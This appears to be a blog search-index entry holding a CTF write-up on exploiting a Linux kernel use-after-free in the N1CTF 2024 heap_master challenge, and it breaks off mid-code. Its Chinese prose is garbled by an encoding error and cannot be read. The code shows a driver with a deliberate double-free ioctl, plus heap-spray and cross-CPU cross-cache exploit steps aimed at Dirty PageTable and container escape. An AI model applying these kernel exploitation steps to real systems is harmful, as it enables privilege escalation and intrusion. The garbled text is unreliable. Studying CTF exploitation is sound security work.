<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>linux file uaf</title>
      <link href="/2024/11/12/fileuaf/"/>
      <url>/2024/11/12/fileuaf/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨ä¸€åˆ‡ä¹‹å‰"><a href="#å†™åœ¨ä¸€åˆ‡ä¹‹å‰" class="headerlink" title="å†™åœ¨ä¸€åˆ‡ä¹‹å‰"></a>å†™åœ¨ä¸€åˆ‡ä¹‹å‰</h2><p>è¿™ä¸ªå‘¨æœ«æ‰“äº† N1CTFï¼Œä¸å¾—ä¸è¯´ N1CTF çš„é¢˜ç›®è´¨é‡æ˜¯çœŸçš„é«˜ï¼Œä¸‹æ¬¡å‡ºé¢˜æˆ‘ä¹Ÿè¦å‡ºå¥½ä¸€ç‚¹ï¼ˆå…¶å®å·²ç»å‡ºå¥½äº†ï¼Œä¸è¿‡æ‰“ç®—èŠ±å¤šç‚¹æ—¶é—´å»ä¼˜åŒ–ğŸ˜‹ğŸ˜‹ï¼Œæ•¬è¯·æœŸå¾…ï¼‰ã€‚è¿™æ¬¡æ¯”èµ›æœ‰ä¸¤é¢˜æˆ‘è§‰å¾—éå¸¸æœ‰æ„æ€ï¼Œä¸€é¢˜æ˜¯ heap_masterï¼Œå¦å¤–ä¸€é¢˜æ˜¯ php_masterã€‚å…¶ä¸­ php_master å½“æ—¶å¹¶æ²¡æœ‰åšå‡ºæ¥ï¼Œæ‰“ç®—ä»¥åæœ‰æ—¶é—´å†ç ”ç©¶ä¸€ä¸‹ï¼ˆå‡ºé¢˜äººçš„é¢„æœŸè§£æ˜¯æ‹¿åˆ°ä»»æ„ååºåˆ—åŒ–ï¼Œå¯æ˜¯æœ‰çš„å¸ˆå‚…è®¤ä¸ºè¿™é“é¢˜ç›®å…¶å®å¯ä»¥æ‹¿åˆ° code execï¼‰ï¼Œæ„Ÿè§‰å¦‚ä½•çªç ´ php æ–°åŠ çš„ shadow heap å°†ä¼šæ˜¯ä¸€ä¸ªçƒ­ç‚¹ã€‚è¿™ç¯‡åšå®¢ä¸»è¦æ˜¯å€Ÿ N1CTF heap_master è¿™é¢˜æ¥è®²è®² linux å†…æ ¸ä¸­çš„ file uaf æ¼æ´åˆ©ç”¨æ–¹å¼</p><h2 id="Dirty-PageTable-in-file-uaf"><a href="#Dirty-PageTable-in-file-uaf" class="headerlink" title="Dirty PageTable in file uaf"></a>Dirty PageTable in file uaf</h2><p>è¿™é‡Œä½¿ç”¨çš„ç¯å¢ƒæ˜¯ N1CTF 2024 heap_masterã€‚</p><h3 id="å‰ç½®å†…å®¹"><a href="#å‰ç½®å†…å®¹" class="headerlink" title="å‰ç½®å†…å®¹"></a>å‰ç½®å†…å®¹</h3><p><font style="color:rgb(66, 75, 93);">æˆ‘ä»¬éƒ½çŸ¥é“å†…æ ¸å¯¹ç‰©ç†å†…å­˜çš„ç®¡ç†æ˜¯æŒ‰ç…§é¡µä¸ºåŸºæœ¬å•ä½è¿›è¡Œçš„ï¼Œè¿›ç¨‹è¿è¡Œèµ·æ¥æ‰€éœ€è¦çš„æ•°æ®ä¹Ÿæ˜¯å­˜å‚¨åœ¨ä¸€ä¸ªä¸€ä¸ªçš„ç‰©ç†é¡µä¸­ï¼Œæ—¢ç„¶ç‰©ç†å†…å­˜é¡µå¯ä»¥å­˜å‚¨è¿›ç¨‹çš„æ™®é€šæ•°æ®ï¼Œé‚£ä¹ˆå®ƒä¹Ÿä¸€å®šå¯ä»¥å­˜å‚¨è¿›ç¨‹è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</font></p><p><font style="color:rgb(66, 75, 93);">äº‹å®ä¸Šï¼Œå†…æ ¸ä¹Ÿæ˜¯è¿™ä¹ˆå¹²çš„ï¼Œå†…æ ¸ä¼šä»ç‰©ç†å†…å­˜ç©ºé—´ä¸­æ‹¿å‡ºä¸€ä¸ªç‰©ç†å†…å­˜é¡µæ¥ä¸“é—¨å­˜å‚¨è¿›ç¨‹é‡Œçš„è¿™äº›å†…å­˜æ˜ å°„å…³ç³»ï¼Œè€Œè¿™ç§ç‰©ç†å†…å­˜é¡µæˆ‘ä»¬å°†å…¶ç§°ä¹‹ä¸ºé¡µè¡¨ï¼Œä»è¿™é‡Œå¯ä»¥çœ‹å‡ºé¡µè¡¨çš„æœ¬è´¨å…¶å®å°±æ˜¯ä¸€ä¸ªç‰©ç†å†…å­˜é¡µã€‚</font></p><p><font style="color:rgb(66, 75, 93);">è€Œå†…æ ¸ä¼šåœ¨é¡µè¡¨ä¸­åˆ’åˆ†å‡ºæ¥ä¸€ä¸ªä¸ªå¤§å°ç›¸ç­‰çš„å°å†…å­˜å—ï¼Œè¿™äº›å°å†…å­˜å—æˆ‘ä»¬ç§°ä¹‹ä¸ºé¡µè¡¨é¡¹ PTEï¼ˆPage Table Entryï¼‰ï¼Œæ­£æ˜¯è¿™ä¸ª PTE ä¿å­˜äº†è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„è™šæ‹Ÿé¡µä¸ç‰©ç†å†…å­˜é¡µçš„æ˜ å°„å…³ç³»ï¼Œä»¥åŠæ§åˆ¶ç‰©ç†å†…å­˜è®¿é—®çš„ç›¸å…³æƒé™ä½ã€‚</font></p><p><font style="color:rgb(66, 75, 93);">å› ä¸ºå†…å­˜æ˜ å°„çš„ç²’åº¦æ˜¯æŒ‰ç…§é¡µä¸ºå•ä½è¿›è¡Œçš„ï¼Œæ‰€ä»¥è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„æ¯ä¸ªè™šæ‹Ÿé¡µåœ¨é¡µè¡¨ä¸­éƒ½ä¼šæœ‰ä¸€ä¸ª PTE ä¸ä¹‹å¯¹åº”ï¼Œè€Œè™šæ‹Ÿé¡µèƒŒåæ˜ å°„çš„ç‰©ç†å†…å­˜é¡µçš„èµ·å§‹åœ°å€å°±ä¿å­˜åœ¨ PTE ä¸­ã€‚PTE å°†ä¼šåœ¨æˆ‘ä»¬åç»­çš„æ”»å‡»ä¸­æ‰®æ¼”é‡è¦çš„è§’è‰²ã€‚</font></p><img src="/2024/11/12/fileuaf/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="æ¼æ´åˆ†æä¸åˆ©ç”¨"><a href="#æ¼æ´åˆ†æä¸åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ†æä¸åˆ©ç”¨"></a><font style="color:rgb(66, 75, 93);">æ¼æ´åˆ†æä¸åˆ©ç”¨</font></h3><p>ç”±äºä»£ç é‡æ¯”è¾ƒå°‘ï¼Œè¿™é‡Œç›´æ¥è´´ä¸Š ida çš„å¤–ä»£ç </p><p>safenote_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">safenote_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v0 = misc_register(&amp;safenote_device);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2B1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = kmem_cache_create(<span class="string">&quot;safenote&quot;</span>, <span class="number">0xC0</span>LL, <span class="number">0LL</span>, <span class="number">0x4052000</span>LL, <span class="number">0LL</span>);</span><br><span class="line">    note_kcache = (kmem_cache *)v1;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(<span class="type">unsigned</span> __int16 *)(v1 + <span class="number">0x34</span>);</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x2C</span>) = <span class="number">0x34</span>;</span><br><span class="line">      *(_DWORD *)(v1 + <span class="number">0x30</span>) = (v2 + <span class="number">0x67</span>) / v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="number">-12</span>;</span><br><span class="line">      printk(&amp;unk_308);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_open</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">safenote_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( already_open )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFF0</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))safenote_open_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">safenote_ioctl</span><span class="params">(file *f, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">u_int32_t</span> heap_idx; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;ioc_arg, v3, <span class="number">4LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1338</span> )                          <span class="comment">// free</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      note[ioc_arg.heap_idx] = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1339</span> )                          <span class="comment">// uaf</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !backdoor_used &amp;&amp; ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      kfree();</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">      backdoor_used = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0x1337</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    heap_idx = ioc_arg.heap_idx;</span><br><span class="line">    <span class="keyword">if</span> ( ioc_arg.heap_idx &lt;= <span class="number">0xFF</span> &amp;&amp; !note[ioc_arg.heap_idx] )</span><br><span class="line">    &#123;</span><br><span class="line">      note[heap_idx] = (<span class="type">char</span> *)kmem_cache_alloc(note_kcache, <span class="number">0x400CC0</span>LL, ioc_arg.heap_idx);</span><br><span class="line">      <span class="keyword">if</span> ( note[ioc_arg.heap_idx] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-12LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>safenote_close</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">safenote_close</span><span class="params">(inode *inodep, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inodep, filp);</span><br><span class="line">  --already_open;</span><br><span class="line">  printk(&amp;unk_297);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§å‡ºé¢˜äººè‡ªå·±åˆ›å»ºäº†ä¸€ä¸ª kmem_cache å¹¶ä¸”åé¢çš„èœå•å †éƒ½ä¼šä»è¯¥ kmem_cache ä¸­ç”³è¯· objectï¼Œè€Œä¸”é¢˜ç›®ç™½ç»™äº†ä¸€æ¬¡ double free çš„æœºä¼šã€‚æ ¹æ®ç»éªŒï¼Œæˆ‘ä»¬è‡ªç„¶è€Œç„¶çš„å°±ä¼šæƒ³åˆ°ç¬¬ä¸€æ­¥è¦å…ˆè®© uaf çš„ object å¯¹åº”çš„ slab è¿›å…¥åˆ° cross cache ä¸­ï¼Œè‡³äºè¦æ€ä¹ˆè¿›ä¸‹é¢è¿™ç¯‡æ–‡ç« å·²ç»å†™çš„éå¸¸æ¸…æ¥šï¼Œè¿™é‡Œä¸å†èµ˜ï¼š<a href="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/">Cross Cache AttackæŠ€æœ¯ç»†èŠ‚åˆ†æ</a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ºé¢˜äººä¸ºè¿™ä¸ªæ–°çš„ kmem_cache è‡ªå®šä¹‰äº†  cpu_partial  å’Œ cpu_partial_slabs çš„å€¼</p><img src="/2024/11/12/fileuaf/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * slab info notecache</span><br><span class="line"> * order: 0, object_size: 192</span><br><span class="line"> * cpu_partial: 52</span><br><span class="line"> * objs_per_slab: 16</span><br><span class="line"> * cpu_partial_slabs: 7</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° cpu_partial çš„å€¼å˜å¾—éå¸¸çš„å¤§ï¼Œå¦‚æœæˆ‘ä»¬è¦ç”¨ä¸Šé¢é“¾æ¥é‚£ä¸ªåšæ³•è‡³å°‘éœ€è¦ç”³è¯· <code>2*objs_per_slab*(cpu_partial+1) = 0x6a0</code> ä¸ªå †å—ï¼Œè€Œåœ¨èœå•å †ä¸­æˆ‘ä»¬æœ€å¤šåŒæ—¶æ‹¥æœ‰ 0x100 ä¸ªå †å—ï¼Œæ‰€ä»¥ä¸Šæ–‡çš„æ–¹æ³•åœ¨è¿™é‡Œæ˜¯è¡Œä¸é€šçš„ï¼Œå¯æ˜¯è¿™é‡Œæœ‰ä¸ªéé¢„æœŸ ğŸ˜‹ã€‚</p><p>æˆ‘ä»¬å‘ç°è¿™é“é¢˜ç›®çš„ kernel ç‰ˆæœ¬ä¸º 6.1.110</p><img src="/2024/11/12/fileuaf/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆ‘ä»¬æŸ¥çœ‹å½“å‰ç‰ˆæœ¬çš„ put_cpu_partial å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cpu_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab, <span class="type">int</span> drain)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">oldslab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab_to_unfreeze</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">int</span> slabs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">oldslab = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldslab) &#123;</span><br><span class="line"><span class="keyword">if</span> (drain &amp;&amp; oldslab-&gt;slabs &gt;= s-&gt;cpu_partial_slabs) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Partial array is full. Move the existing set to the</span></span><br><span class="line"><span class="comment"> * per node partial list. Postpone the actual unfreezing</span></span><br><span class="line"><span class="comment"> * outside of the critical section.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_to_unfreeze = oldslab;</span><br><span class="line">oldslab = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">slabs = oldslab-&gt;slabs;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slabs++;</span><br><span class="line"></span><br><span class="line">slab-&gt;slabs = slabs;</span><br><span class="line">slab-&gt;next = oldslab;</span><br><span class="line"></span><br><span class="line">this_cpu_write(s-&gt;cpu_slab-&gt;partial, slab);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab_to_unfreeze) &#123;</span><br><span class="line">__unfreeze_partials(s, slab_to_unfreeze);</span><br><span class="line">stat(s, CPU_PARTIAL_DRAIN);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å½“å‰ç‰ˆæœ¬çš„å†…æ ¸åˆ¤æ–­ slab æ˜¯å¦è¦è¢« buddy system å›æ”¶æ˜¯ä¸ cpu_partial_slabs è¿›è¡Œæ¯”è¾ƒè€Œä¸æ˜¯ cpu_partialï¼Œè€Œ cpu_partial_slabs åœ¨å½“å‰ç¯å¢ƒé‡Œçš„å€¼ä¸º 7ï¼Œæ‰€ä»¥æˆ‘ä»¬å®Œå…¨å¯ä»¥ç›´æ¥å–· 7 ä¸ªé¡µçš„å †å—ï¼ˆæˆ‘å–·äº†12ä¸ªï¼‰ç„¶åç”³è¯·å‡º uaf çš„å †å—æœ€åå†ä»å¤´ä¾æ¬¡é‡Šæ”¾æ‰€æœ‰ç”³è¯·å‡ºæ¥çš„å †å—å°±èƒ½è®© uaf çš„å †å—å¯¹åº”çš„ slab ç»™ buddy system å›æ”¶ï¼Œæˆ‘çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> uaf_index = <span class="number">0xc0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    add(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xff</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == uaf_index)&#123;</span><br><span class="line">        uaf(uaf_index);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    del(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œå‡ºé¢˜äººçš„é¢„æœŸè§£ä¸ºï¼š<font style="color:rgb(26, 32, 41);">åœ¨ä¸åŒçš„ CPU ä¸Šæ‰§è¡Œæ·»åŠ å’Œé‡Šæ”¾æ“ä½œã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨ CPU0 ä¸Šè¿›è¡Œåˆ†é…ï¼Œç„¶ååœ¨ CPU1 ä¸Šé‡Šæ”¾ã€‚ç”±äº CPU0 æ— æ³•è®¿é—®ç”± CPU1 ç®¡ç†çš„ freelist æˆ– partial slabsï¼Œè¿™ä¿ƒä½¿ CPU1 è¾¾åˆ°å…¶ partial é˜ˆå€¼ï¼Œè§¦å‘ put_cpu_partialã€‚</font></p><p><font style="color:rgb(26, 32, 41);">å…¶å®ç°ä»£ç å¦‚ä¸‹ï¼š</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> safe_note_objs_per_slab = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line">info(<span class="string">&quot;dev_fd = %d&quot;</span>, dev_fd);</span><br><span class="line">info(<span class="string">&quot;allocate in cpu 0&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">add(i);</span><br><span class="line"><span class="keyword">if</span>(i == safe_note_objs_per_slab / <span class="number">2</span>)&#123;</span><br><span class="line">info(<span class="string">&quot;allocate at note[0]&quot;</span>);</span><br><span class="line">add(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;trigger backdoor int cpu 1 at note[0]&quot;</span>);</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line">uaf(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; safe_note_objs_per_slab; i++)&#123;</span><br><span class="line">del(i);</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Trigger done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to Spray at different cpu_slab to cross cache&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">add(j);</span><br><span class="line">&#125;</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; NOTE_SIZE; j++)&#123;</span><br><span class="line">del(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info(<span class="string">&quot;Spray done...&quot;</span>);</span><br><span class="line">info(<span class="string">&quot;Try to cross cache to file&quot;</span>);</span><br><span class="line">bind_core(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(26, 32, 41);">ä¸å¾—ä¸è¯´è¿™æ‹›ç¡®å®æœ‰ç‚¹ç‰›é€¼çš„è¯´ï¼ˆ</font></p><p><font style="color:rgb(26, 32, 41);">è¿™é“é¢˜ç›®åœ¨ kernel çš„åŸºç¡€ä¸Šå¥—äº†ä¸€å±‚å®¹å™¨é€ƒé€¸ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡æœ€ç»ˆæ˜¯è¦èƒ½å¤Ÿå®ç°ä»»æ„ shellcode æ‰§è¡Œæˆ–è€… æ‰§è¡Œæˆ‘ä»¬çš„ ropï¼Œä½†ç”±äºå‰è€…çš„é™åˆ¶æ›´å°‘ä¸€ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ shellcodeï¼Œè‡ªç„¶è€Œç„¶çš„æˆ‘ä»¬ä¹Ÿä¼šæƒ³åˆ° dirty pageTableè¿™ç§æ‰“æ³•ã€‚è¿™ç§æ‰“æ³•çš„åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯ä¿®æ”¹æˆ‘ä»¬åœ¨å‰ç½®å†…å®¹é‡Œé¢æ‰€æåˆ°çš„ PTEï¼Œè¿›è€Œèƒ½å¤Ÿå®ç°å†…æ ¸ä¸Šä»»æ„ç‰©ç†åœ°å€çš„è¯»å†™ã€‚ä½†æ˜¯è¿™é‡Œåˆæœ‰ä¸€ä¸ªæ–°é—®é¢˜ï¼Œå‡ºé¢˜äººç¼–å†™çš„å†…æ ¸é©±åŠ¨å¹¶æ²¡æœ‰ç»™æˆ‘ä»¬è¯»å†™ uaf å †å—çš„æœºä¼šï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ file ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“åœ¨å½“å‰ç‰ˆæœ¬çš„å†…æ ¸å®šä¹‰å¦‚ä¸‹ï¼š</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 